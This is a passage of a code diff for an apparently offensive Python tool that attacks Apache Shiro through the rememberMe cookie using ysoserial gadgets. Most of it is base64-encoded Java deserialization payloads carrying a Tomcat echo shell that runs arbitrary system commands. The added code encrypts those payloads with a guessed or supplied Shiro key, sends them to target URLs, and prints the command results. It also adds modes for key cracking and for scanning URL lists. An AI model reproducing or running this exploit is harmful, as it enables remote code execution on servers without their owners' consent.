ABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHEAfgANeA==",
+                        "Jdk7u21":"rO0ABXNyABdqYXZhLnV0aWwuTGlua2VkSGFzaFNldNhs11qV3SoeAgAAeHIAEWphdmEudXRpbC5IYXNoU2V0ukSFlZa4tzQDAAB4cHcMAAAAED9AAAAAAAACc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMACEkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFoAFV91c2VTZXJ2aWNlc01lY2hhbmlzbUwAC19hdXhDbGFzc2VzdAA7TGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0hhc2h0YWJsZTtbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAH/////AXB1cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAPA8r+ur4AAAAyAOkBAAxGb292NGhBMnZ1U1MHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEAEUZvb3Y0aEEydnVTUy5qYXZhAQAJd3JpdGVCb2R5AQAXKExqYXZhL2xhbmcvT2JqZWN0O1tCKVYBACRvcmcuYXBhY2hlLnRvbWNhdC51dGlsLmJ1Zi5CeXRlQ2h1bmsIAAkBAA9qYXZhL2xhbmcvQ2xhc3MHAAsBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwADQAOCgAMAA8BAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAARABIKAAwAEwEACHNldEJ5dGVzCAAVAQACW0IHABcBABFqYXZhL2xhbmcvSW50ZWdlcgcAGQEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwwAGwAcCQAaAB0BABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMAB8AIAoADAAhAQAGPGluaXQ+AQAEKEkpVgwAIwAkCgAaACUBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHACcBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMACkAKgoAKAArAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7DAAtAC4KAAQALwEAB2RvV3JpdGUIADEBAAlnZXRNZXRob2QMADMAIAoADAA0AQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcANgEAE2phdmEubmlvLkJ5dGVCdWZmZXIIADgBAAR3cmFwCAA6AQAEQ29kZQEACkV4Y2VwdGlvbnMBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwA+AQANU3RhY2tNYXBUYWJsZQEABWdldEZWAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DABDAEQKAAwARQEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcARwEADWdldFN1cGVyY2xhc3MMAEkALgoADABKAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAjAEwKAEgATQEAImphdmEvbGFuZy9yZWZsZWN0L0FjY2Vzc2libGVPYmplY3QHAE8BAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAUQBSCgBQAFMBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcAVQEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABXAFgKAFYAWQEAEGphdmEvbGFuZy9TdHJpbmcHAFsBAAMoKVYMACMAXQoABABeAQAQamF2YS9sYW5nL1RocmVhZAcAYAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwAYgBjCgBhAGQBAA5nZXRUaHJlYWRHcm91cAEAGSgpTGphdmEvbGFuZy9UaHJlYWRHcm91cDsMAGYAZwoAYQBoAQAHdGhyZWFkcwgAagwAQQBCCgACAGwBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwBuAQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DABwAHEKAGEAcgEABGV4ZWMIAHQBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwAdgB3CgBcAHgBAARodHRwCAB6AQAGdGFyZ2V0CAB8AQASamF2YS9sYW5nL1J1bm5hYmxlBwB+AQAGdGhpcyQwCACAAQAHaGFuZGxlcggAggEABmdsb2JhbAgAhAEACnByb2Nlc3NvcnMIAIYBAA5qYXZhL3V0aWwvTGlzdAcAiAEABHNpemUBAAMoKUkMAIoAiwsAiQCMAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7DABXAI4LAIkAjwEAA3JlcQgAkQEAC2dldFJlc3BvbnNlCACTAQAJZ2V0SGVhZGVyCACVAQAIVGVzdGVjaG8IAJcBAAdpc0VtcHR5AQADKClaDACZAJoKAFwAmwEACXNldFN0YXR1cwgAnQEACWFkZEhlYWRlcggAnwEAB1Rlc3RjbWQIAKEBAAdvcy5uYW1lCACjAQAQamF2YS9sYW5nL1N5c3RlbQcApQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMAKcAqAoApgCpAQALdG9Mb3dlckNhc2UMAKsAcQoAXACsAQAGd2luZG93CACuAQAHY21kLmV4ZQgAsAEAAi9jCACyAQAHL2Jpbi9zaAgAtAEAAi1jCAC2AQARamF2YS91dGlsL1NjYW5uZXIHALgBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIHALoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWDAAjALwKALsAvQEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7DAC/AMAKALsAwQEAEWphdmEvbGFuZy9Qcm9jZXNzBwDDAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwwAxQDGCgDEAMcBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYMACMAyQoAuQDKAQACXEEIAMwBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsMAM4AzwoAuQDQAQAEbmV4dAwA0gBxCgC5ANMBAAhnZXRCeXRlcwEABCgpW0IMANUA1goAXADXDAAHAAgKAAIA2QEADWdldFByb3BlcnRpZXMBABgoKUxqYXZhL3V0aWwvUHJvcGVydGllczsMANsA3AoApgDdAQATamF2YS91dGlsL0hhc2h0YWJsZQcA3wEACHRvU3RyaW5nDADhAHEKAOAA4gEAE1tMamF2YS9sYW5nL1N0cmluZzsHAOQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwDmCgDnAF4AIQACAOcAAAAAAAMACgAHAAgAAgA8AAAA3AAIAAUAAACxEgq4ABBOLbYAFE0tEhYGvQAMWQMSGFNZBLIAHlNZBbIAHlO2ACIsBr0ABFkDK1NZBLsAGlkDtwAmU1kFuwAaWSu+twAmU7YALFcqtgAwEjIEvQAMWQMtU7YANSoEvQAEWQMsU7YALFenAEg6BBI5uAAQTi0SOwS9AAxZAxIYU7YAIi0EvQAEWQMrU7YALE0qtgAwEjIEvQAMWQMtU7YANSoEvQAEWQMsU7YALFenAAOxAAEAAABoAGsANwABAEAAAAARAAL3AGsHADf9AEQHAAQHAAwAPQAAAAQAAQA/AAoAQQBCAAIAPAAAAH4AAwAFAAAAPwFNKrYAME6nABktK7YARk2nABanAAA6BC22AEtOpwADLRIEpv/nLAGmAAy7AEhZK7cATr8sBLYAVCwqtgBasAABAAoAEwAWAEgAAQBAAAAAJQAG/QAKBwBWBwAMCP8AAgAEBwAEBwBcBwBWBwAMAAEHAEgJBQ0APQAAAAQAAQA/AAEAIwBdAAIAPAAAAzYACAANAAACPyq3AOgDNgS4AGW2AGkSa7gAbcAAbzoFAzYGFQYZBb6iAh8ZBRUGMjoHGQcBpgAGpwIJGQe2AHNOLRJ1tgB5mgAMLRJ7tgB5mgAGpwHuGQcSfbgAbUwrwQB/mgAGpwHcKxKBuABtEoO4AG0ShbgAbUynAAs6CKcBw6cAACsSh7gAbcAAiToJAzYKFQoZCbkAjQEAogGeGQkVCrkAkAIAOgsZCxKSuABtTCu2ADASlAO9AAy2ADUrA70ABLYALE0rtgAwEpYEvQAMWQMSXFO2ADUrBL0ABFkDEphTtgAswABcTi0BpQAKLbYAnJkABqcAWCy2ADASngS9AAxZA7IAHlO2ADUsBL0ABFkDuwAaWREAyLcAJlO2ACxXLLYAMBKgBb0ADFkDElxTWQQSXFO2ADUsBb0ABFkDEphTWQQtU7YALFcENgQrtgAwEpYEvQAMWQMSXFO2ADUrBL0ABFkDEqJTtgAswABcTi0BpQAKLbYAnJkABqcAjSy2ADASngS9AAxZA7IAHlO2ADUsBL0ABFkDuwAaWREAyLcAJlO2ACxXEqS4AKq2AK0Sr7YAeZkAGAa9AFxZAxKxU1kEErNTWQUtU6cAFQa9AFxZAxK1U1kEErdTWQUtUzoMLLsAuVm7ALtZGQy3AL62AMK2AMi3AMsSzbYA0bYA1LYA2LgA2gQ2BC0BpQAKLbYAnJkACBUEmgAGpwAQLLgA3rYA47YA2LgA2hUEmQAGpwAJhAoBp/5cFQSZAAanAAmEBgGn/d+xAAEAXwBwAHMAPwABAEAAAADdABn/ABoABwcAAgAAAAEHAG8BAAD8ABcHAGH/ABcACAcAAgAABwBcAQcAbwEHAGEAAAL/ABEACAcAAgcABAAHAFwBBwBvAQcAYQAAUwcAPwT/AAIACAcAAgcABAAHAFwBBwBvAQcAYQAA/gANAAcAiQH/AGMADAcAAgcABAcABAcAXAEHAG8BBwBhAAcAiQEHAAQAAAL7AFQuAvsATVEHAOUpCwQCDAf/AAUACwcAAgcABAAHAFwBBwBvAQcAYQAHAIkBAAD/AAcACAcAAgAAAAEHAG8BBwBhAAD6AAUAPQAAAAQAAQA/AAEABQAAAAIABnB0AANhYmNzcgAUamF2YS51dGlsLlByb3BlcnRpZXM5EtB6cDY+mAIAAUwACGRlZmF1bHRzcQB+AAh4cgATamF2YS51dGlsLkhhc2h0YWJsZRO7DyUhSuS4AwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAh3CAAAAAsAAAAAeHB3AQB4c30AAAABAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlc3hyABdqYXZhLmxhbmcucmVmbGVjdC5Qcm94eeEn2iDMEEPLAgABTAABaHQAJUxqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uSGFuZGxlcjt4cHNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAMdwgAAAAQAAAAAXQACGY1YTVhNjA4cQB+AAl4dnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHg=",
+                        "Jdk8u20":"rO0ABXNyABdqYXZhLnV0aWwuTGlua2VkSGFzaFNldNhs11qV3SoeAgAAeHIAEWphdmEudXRpbC5IYXNoU2V0ukSFlZa4tzQDAABzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAFSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WgAVX3VzZVNlcnZpY2VzTWVjaGFuaXNtWwAKX2J5dGVjb2Rlc3QAA1tbQkwABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7eHAAAAAB/////wF1cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAPA8r+ur4AAAAyAOkBAAxGb29veTZhOTVuNkYHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEAEUZvb295NmE5NW42Ri5qYXZhAQAJd3JpdGVCb2R5AQAXKExqYXZhL2xhbmcvT2JqZWN0O1tCKVYBACRvcmcuYXBhY2hlLnRvbWNhdC51dGlsLmJ1Zi5CeXRlQ2h1bmsIAAkBAA9qYXZhL2xhbmcvQ2xhc3MHAAsBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwADQAOCgAMAA8BAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAARABIKAAwAEwEACHNldEJ5dGVzCAAVAQACW0IHABcBABFqYXZhL2xhbmcvSW50ZWdlcgcAGQEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwwAGwAcCQAaAB0BABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMAB8AIAoADAAhAQAGPGluaXQ+AQAEKEkpVgwAIwAkCgAaACUBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHACcBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMACkAKgoAKAArAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7DAAtAC4KAAQALwEAB2RvV3JpdGUIADEBAAlnZXRNZXRob2QMADMAIAoADAA0AQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcANgEAE2phdmEubmlvLkJ5dGVCdWZmZXIIADgBAAR3cmFwCAA6AQAEQ29kZQEACkV4Y2VwdGlvbnMBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwA+AQANU3RhY2tNYXBUYWJsZQEABWdldEZWAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DABDAEQKAAwARQEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcARwEADWdldFN1cGVyY2xhc3MMAEkALgoADABKAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAjAEwKAEgATQEAImphdmEvbGFuZy9yZWZsZWN0L0FjY2Vzc2libGVPYmplY3QHAE8BAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAUQBSCgBQAFMBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcAVQEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABXAFgKAFYAWQEAEGphdmEvbGFuZy9TdHJpbmcHAFsBAAMoKVYMACMAXQoABABeAQAQamF2YS9sYW5nL1RocmVhZAcAYAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwAYgBjCgBhAGQBAA5nZXRUaHJlYWRHcm91cAEAGSgpTGphdmEvbGFuZy9UaHJlYWRHcm91cDsMAGYAZwoAYQBoAQAHdGhyZWFkcwgAagwAQQBCCgACAGwBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwBuAQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DABwAHEKAGEAcgEABGV4ZWMIAHQBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwAdgB3CgBcAHgBAARodHRwCAB6AQAGdGFyZ2V0CAB8AQASamF2YS9sYW5nL1J1bm5hYmxlBwB+AQAGdGhpcyQwCACAAQAHaGFuZGxlcggAggEABmdsb2JhbAgAhAEACnByb2Nlc3NvcnMIAIYBAA5qYXZhL3V0aWwvTGlzdAcAiAEABHNpemUBAAMoKUkMAIoAiwsAiQCMAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7DABXAI4LAIkAjwEAA3JlcQgAkQEAC2dldFJlc3BvbnNlCACTAQAJZ2V0SGVhZGVyCACVAQAIVGVzdGVjaG8IAJcBAAdpc0VtcHR5AQADKClaDACZAJoKAFwAmwEACXNldFN0YXR1cwgAnQEACWFkZEhlYWRlcggAnwEAB1Rlc3RjbWQIAKEBAAdvcy5uYW1lCACjAQAQamF2YS9sYW5nL1N5c3RlbQcApQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMAKcAqAoApgCpAQALdG9Mb3dlckNhc2UMAKsAcQoAXACsAQAGd2luZG93CACuAQAHY21kLmV4ZQgAsAEAAi9jCACyAQAHL2Jpbi9zaAgAtAEAAi1jCAC2AQARamF2YS91dGlsL1NjYW5uZXIHALgBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIHALoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWDAAjALwKALsAvQEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7DAC/AMAKALsAwQEAEWphdmEvbGFuZy9Qcm9jZXNzBwDDAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwwAxQDGCgDEAMcBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYMACMAyQoAuQDKAQACXEEIAMwBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsMAM4AzwoAuQDQAQAEbmV4dAwA0gBxCgC5ANMBAAhnZXRCeXRlcwEABCgpW0IMANUA1goAXADXDAAHAAgKAAIA2QEADWdldFByb3BlcnRpZXMBABgoKUxqYXZhL3V0aWwvUHJvcGVydGllczsMANsA3AoApgDdAQATamF2YS91dGlsL0hhc2h0YWJsZQcA3wEACHRvU3RyaW5nDADhAHEKAOAA4gEAE1tMamF2YS9sYW5nL1N0cmluZzsHAOQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwDmCgDnAF4AIQACAOcAAAAAAAMACgAHAAgAAgA8AAAA3AAIAAUAAACxEgq4ABBOLbYAFE0tEhYGvQAMWQMSGFNZBLIAHlNZBbIAHlO2ACIsBr0ABFkDK1NZBLsAGlkDtwAmU1kFuwAaWSu+twAmU7YALFcqtgAwEjIEvQAMWQMtU7YANSoEvQAEWQMsU7YALFenAEg6BBI5uAAQTi0SOwS9AAxZAxIYU7YAIi0EvQAEWQMrU7YALE0qtgAwEjIEvQAMWQMtU7YANSoEvQAEWQMsU7YALFenAAOxAAEAAABoAGsANwABAEAAAAARAAL3AGsHADf9AEQHAAQHAAwAPQAAAAQAAQA/AAoAQQBCAAIAPAAAAH4AAwAFAAAAPwFNKrYAME6nABktK7YARk2nABanAAA6BC22AEtOpwADLRIEpv/nLAGmAAy7AEhZK7cATr8sBLYAVCwqtgBasAABAAoAEwAWAEgAAQBAAAAAJQAG/QAKBwBWBwAMCP8AAgAEBwAEBwBcBwBWBwAMAAEHAEgJBQ0APQAAAAQAAQA/AAEAIwBdAAIAPAAAAzYACAANAAACPyq3AOgDNgS4AGW2AGkSa7gAbcAAbzoFAzYGFQYZBb6iAh8ZBRUGMjoHGQcBpgAGpwIJGQe2AHNOLRJ1tgB5mgAMLRJ7tgB5mgAGpwHuGQcSfbgAbUwrwQB/mgAGpwHcKxKBuABtEoO4AG0ShbgAbUynAAs6CKcBw6cAACsSh7gAbcAAiToJAzYKFQoZCbkAjQEAogGeGQkVCrkAkAIAOgsZCxKSuABtTCu2ADASlAO9AAy2ADUrA70ABLYALE0rtgAwEpYEvQAMWQMSXFO2ADUrBL0ABFkDEphTtgAswABcTi0BpQAKLbYAnJkABqcAWCy2ADASngS9AAxZA7IAHlO2ADUsBL0ABFkDuwAaWREAyLcAJlO2ACxXLLYAMBKgBb0ADFkDElxTWQQSXFO2ADUsBb0ABFkDEphTWQQtU7YALFcENgQrtgAwEpYEvQAMWQMSXFO2ADUrBL0ABFkDEqJTtgAswABcTi0BpQAKLbYAnJkABqcAjSy2ADASngS9AAxZA7IAHlO2ADUsBL0ABFkDuwAaWREAyLcAJlO2ACxXEqS4AKq2AK0Sr7YAeZkAGAa9AFxZAxKxU1kEErNTWQUtU6cAFQa9AFxZAxK1U1kEErdTWQUtUzoMLLsAuVm7ALtZGQy3AL62AMK2AMi3AMsSzbYA0bYA1LYA2LgA2gQ2BC0BpQAKLbYAnJkACBUEmgAGpwAQLLgA3rYA47YA2LgA2hUEmQAGpwAJhAoBp/5cFQSZAAanAAmEBgGn/d+xAAEAXwBwAHMAPwABAEAAAADdABn/ABoABwcAAgAAAAEHAG8BAAD8ABcHAGH/ABcACAcAAgAABwBcAQcAbwEHAGEAAAL/ABEACAcAAgcABAAHAFwBBwBvAQcAYQAAUwcAPwT/AAIACAcAAgcABAAHAFwBBwBvAQcAYQAA/gANAAcAiQH/AGMADAcAAgcABAcABAcAXAEHAG8BBwBhAAcAiQEHAAQAAAL7AFQuAvsATVEHAOUpCwQCDAf/AAUACwcAAgcABAAHAFwBBwBvAQcAYQAHAIkBAAD/AAcACAcAAgAAAAEHAG8BBwBhAAD6AAUAPQAAAAQAAQA/AAEABQAAAAIABnQAA2FiY3cBAHhzcgApamF2YS5iZWFucy5iZWFuY29udGV4dC5CZWFuQ29udGV4dFN1cHBvcnS8SCDwkY+5DAMAAUkADHNlcmlhbGl6YWJsZXhyAC5qYXZhLmJlYW5zLmJlYW5jb250ZXh0LkJlYW5Db250ZXh0Q2hpbGRTdXBwb3J0V9TvxwTcciUDAAFMABRiZWFuQ29udGV4dENoaWxkUGVlcnQAKUxqYXZhL2JlYW5zL2JlYW5jb250ZXh0L0JlYW5Db250ZXh0Q2hpbGQ7eHBxAH4ADngAAAABc3IAMnN1bi5yZWZsZWN0LmFubm90YXRpb24uQW5ub3RhdGlvbkludm9jYXRpb25IYW5kbGVyVcr1DxXLfqUDAAJMAAxtZW1iZXJWYWx1ZXN0AA9MamF2YS91dGlsL01hcDtMAAR0eXBldAARTGphdmEvbGFuZy9DbGFzczt4cHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAIZjVhNWE2MDhxAH4ABXh2cgAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXMAAAAAAAAAAAMAAHhwdwQAAAAAeHhwdwwAAAAQP0AAAAAAAAJxAH4ABXN9AAAAAQAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXN4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBxAH4AEng="}
+        if key == None:
+            return
+
+        if gadget in tomcatEchoPayload:
+            checker = str(uuid.uuid1())
+
+            command = self.command + " && echo " + checker if self.command else "whoami"+ " && echo "+ checker
+
+            headers = {"User-Agent":Factory.create().user_agent(),
+                        "Connection":"close",
+                        "Testecho":checker,
+                        "Testcmd":command}
+
+            if type == "GCM":
+                payload = Payload(key).gcm_encrypt(base64.b64decode(tomcatEchoPayload[gadget])).decode()
+            else:
+                payload = Payload(key).cbc_encrypt(base64.b64decode(tomcatEchoPayload[gadget])).decode()
+            try:
+                if url:
+                    cookie = {"rememberMe":payload}
+                    rsp = requests.get(self.url, headers=headers, cookies=cookie, verify=False, stream=True)
+                    if rsp.headers["Testecho"] == checker:
+                        print("[*] Congratulation: exploit success!")
+                        regex = re.compile(r'((?:.|\n)*){0}'.format(checker))
+                        try:
+                            flag = 0
+                            try:
+                                for i in rsp.iter_content(chunk_size=102400):
+                                    if checker in str(i.decode()):
+                                        flag = 1
+                                        print(i.decode().replace(checker,"")) 
+                            except Exception as e:
+                                print(e)
+                            if flag != 1:
+                                result = regex.findall(rsp.text)
+                                print(result[0])
+                        except KeyError as e:
+                            print(e)
+                            print("[!] Failed to get result,check response manual!")
+                            print("[*] Testecho: {}".format(checker))
+                            print("[*] Cookie: rememberMe={}".format(payload))
+                else:
+                    print("[*] Exploit Manual: ")
+                    print("[*] Testcmd: whoami")
+                    print("[*] Cookie: rememberMe={}".format(payload))
+            except Exception as e:
+                    print("[*] Something error: {}".format(e))
+                    print("[*] Exploit Manual: ")
+                    print("[*] Testecho: {}".format(checker))
+                    print("[*] Cookie: rememberMe={}".format(payload))
+        else:
+            print("[!] Gadget Not Support")
+
+class CommandFactory(Command):
+    def __init__(self, mode, url, type, key, data, proxies, command, gadget):
+        super().__init__(mode, url, type, key, data, proxies, command, gadget)
+
+    def run(self):
+        print('*' * 100)
+        if "http://" in self.url or "https://" in self.url:
+            _type = 'url'
+        else:
+            _type = 'file'
+
+        if self.mode == 'check' and  _type == 'url':
+            CheckShiro(self.mode, self.url, self.type, self.key, self.data, self.proxies, self.command, self.gadget).check_shiro()
+
+        elif self.mode == 'check' and _type == 'file':
+            with open(os.path.join(sys.path[0], self.url),'r') as fr:
+                urls = fr.read().splitlines()
+            for self.url in urls:
+                CheckShiro(self.mode, self.url, self.type, self.key, self.data, self.proxies, self.command, self.gadget).check_shiro()
+
+        elif self.mode == "crack" and _type =='url':
+            VerifyKey(self.mode, self.url, self.type, self.key, self.data, self.proxies, self.command, self.gadget).crack()
+
+        elif self.mode == "crack" and _type =='file':
+            with open(os.path.join(sys.path[0], self.url),'r') as fr:
+                urls = fr.read().splitlines()
+            for self.url in urls:
+                VerifyKey(self.mode, self.url, self.type, self.key, self.data, self.proxies, self.command, self.gadget).crack()
+
+        elif self.mode == "echo" and _type == 'url':
+            Exploit(self.mode, self.url, self.type, self.key, self.data, self.proxies, self.command, self.gadget).tomcat_echo()
+
+        elif self.mode == "echo" and _type == 'file':
+            with open(os.path.join(sys.path[0], self.url),'r') as fr:
+                urls = fr.read().splitlines()
+            for self.url in urls:
+                Exploit(self.mode, self.url, self.type, self.key, self.data, self.proxies, self.command, self.gadget).tomcat_echo()
 
 if __name__ == '__main__':
-    description='''
-    Usage:
-    python3 -m [mode] arguments
-    
-    example:
-
-    '''
     parser = argparse.ArgumentParser(description="This is a simple tool to attack shiro with ysoserial")
-    parser.add_argument('--mode', '-m', type=str, metavar='', required=True, help='brute/yso/echo/encode')
-    parser.add_argument('--url', '-u', type=str, metavar='', required=True, help='Target URL Address')
-    parser.add_argument('--type', '-t', type=str, metavar='', default="CBC", help='Cipher type, gcm or cbc')
-    parser.add_argument('--data', '-d', type=str, metavar='', help='Using this parameter will initiate an HTTP request using the post method')
-    parser.add_argument('--key', '-k', type=str, metavar='', help='Specify a shiro key or will use dictionary brute force cracking')
-    
-    # parser.add_argument('--gadget','-g', type=str ,help='')
-    # parser.add_argument('--command','-c', type=str ,help='Specific Execute Command')
-    # parser.add_argument('--ser','-s', type=str ,help='Specific serialize File Path')
+    parser.add_argument('--mode', '-m', type=str, required=True, help='check/crack/yso/echo/encode')
+    parser.add_argument('--url', '-u', type=str, metavar='', required=True, help='Target URL Address or the file containing the target URL')
+    parser.add_argument('--type', '-t', type=str, metavar='', default="CBC", help='Cipher Type, GCM or CBC')
+    parser.add_argument('--data', '-d', type=str, metavar='', default=None, help='Using this parameter will make an HTTP POST request')
+    parser.add_argument('--key', '-k', type=str, metavar='', default=None, help='Specify a Shiro Key or will use dictionary brute force cracking')
+    parser.add_argument('--gadget', '-g', type=str, metavar='', default=None, help='Specific Ysoserial Gadget')
+    parser.add_argument('--command', '-c', type=str, metavar='', default='whoami', help='Specific Execute Command')
+    parser.add_argument('--proxies', '-p', type=str, metavar='', default={}, help='Specific Proxy')
+    # parser.add_argument('--ser','-s', type=str, help='Specific serialize File Path')
     args = parser.parse_args()
 
-    mode = str.lower(args.mode)
-    url  = args.url
-    type = str.upper(args.type)
-    data = args.data
-    key  = args.key
+    mode    = str.lower(args.mode)
+    url     = args.url
+    type    = str.upper(args.type)
+    data    = args.data
+    key     = args.key
